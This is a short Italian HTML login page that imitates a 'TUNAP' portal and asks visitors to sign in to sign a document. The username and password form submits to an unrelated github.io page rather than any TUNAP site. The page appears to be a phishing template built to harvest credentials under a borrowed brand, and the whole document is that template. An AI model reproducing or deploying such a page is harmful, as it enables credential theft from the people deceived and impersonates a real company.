<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8" />
  <title>Accesso - Portale TUNAP</title>
</head>
<body style="font-family: Arial, sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f4;">
  
  <!-- Logo locale -->
  <img src="logo_tunap.png" alt="TUNAP Logo" width="150" /><br /><br />

  <!-- Titolo -->
  <h2>Accedi per firmare il documento</h2>

  <!-- Form di login -->
  <form action="https://lucaaremm.github.io/finalpage/finalpage.html" method="post">
    <input
      type="text"
      name="username"
      placeholder="Nome utente"
      required
      style="padding: 8px; width: 250px;"
    /><br /><br />
    <input
      type="password"
      name="password"
      placeholder="Password"
      required
      style="padding: 8px; width: 250px;"
    /><br /><br />
    <button type="submit" style="padding: 10px 20px;">Accedi</button>
  </form>
</body>
</html>
